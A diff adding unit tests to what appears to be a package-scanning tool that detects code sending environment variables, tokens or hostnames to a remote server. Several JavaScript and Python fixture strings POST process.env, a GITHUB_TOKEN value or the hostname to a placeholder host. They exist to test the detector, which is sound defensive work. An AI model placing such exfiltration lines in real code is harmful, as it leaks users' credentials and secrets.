@@ -112,6 +112,54 @@ class HostInfoTests(unittest.TestCase):
                 self.assertEqual(core.install_script_risk(text), [])
 
 
+class FlowNamesTests(unittest.TestCase):
+    """0.1.8: the names the data flow follows. A receiver's member is
+    followed, not the receiver every method shares (`this.env`, `self.token`);
+    keywords name nothing (`const [a, b] = …`, `.then(function* (x) …)`); an
+    object literal's methods and a callback given a call are code, not data
+    (a bundle's modules: `require_x = __commonJS({ "x.js"(exports) { … } })`);
+    and in a long text (a bundle, whose modules reuse names) a name carries
+    the data only near where it was given it."""
+
+    SEND = "fetch('https://x.invalid/', {method: 'POST', body: %s});\n"
+
+    def kind(self, text):
+        found = core.local_data_sent_at(text)
+        return None if found is None else found[1:3]
+
+    def test_a_receivers_member(self):
+        js = "class C {\n  constructor() { this.env = process.env; }\n  send() { " + self.SEND + "}\n}\n"
+        self.assertEqual(self.kind(js % "JSON.stringify(this.env)"), ("environment", "the whole environment"))
+        self.assertIsNone(self.kind(js % "JSON.stringify(this.payload)"))
+        py = ("import os, requests\nclass C:\n    def __init__(self):\n        self.token = os.environ['GITHUB_TOKEN']\n"
+              "    def go(self):\n        requests.post('https://x.invalid/', data=self.%s)\n")
+        self.assertEqual(self.kind(py % "token"), ("environment", "GITHUB_TOKEN"))
+        self.assertIsNone(self.kind(py % "payload"))
+
+    def test_keywords_name_nothing(self):
+        array = "const os = require('os');\nconst [host, port] = [os.hostname(), 80];\n" + self.SEND
+        self.assertEqual(self.kind(array % "host"), ("identity", "hostname"))
+        self.assertIsNone(self.kind(array % "String(port)"))
+        generator = ("const fs = require('fs');\nfs.promises.readFile('/etc/hostname').then(function* (x) {});\n"
+                     + self.SEND % "JSON.stringify({f: function () { return 1; }})")
+        self.assertIsNone(self.kind(generator))
+
+    def test_methods_are_code(self):
+        bundle = ("var require_x = __commonJS({ \"x.js\"(exports) { var e = process.env; exports.e = 1; } });\n"
+                  "var x = require_x();\n" + self.SEND % "JSON.stringify(x)")
+        self.assertIsNone(self.kind(bundle))
+
+    def test_a_long_text_follows_a_name_near_its_data(self):
+        filler = "".join("function f%d(a) { return a + %d; }\n" % (k, k) for k in range(8000))
+        self.assertGreater(len(filler), core._LD_LONG)
+        payload = "const os = require('os');\nconst data = {h: os.hostname()};\n" + self.SEND % "JSON.stringify(data)"
+        self.assertEqual(self.kind(filler + payload + filler), ("identity", "hostname"))
+        far = "var data = {h: require('os').hostname()};\n" + filler + self.SEND % "JSON.stringify(data)"
+        self.assertIsNone(self.kind(far))
+        near = "var data = {h: require('os').hostname()};\n" + filler[:2000] + self.SEND % "JSON.stringify(data)"
+        self.assertEqual(self.kind(near), ("identity", "hostname"))         # (a short text: anywhere)
+
+
 class ImportTimeGradingTests(unittest.TestCase):
     def grade(self, text):
         reasons, line = core.import_time_risk(text)
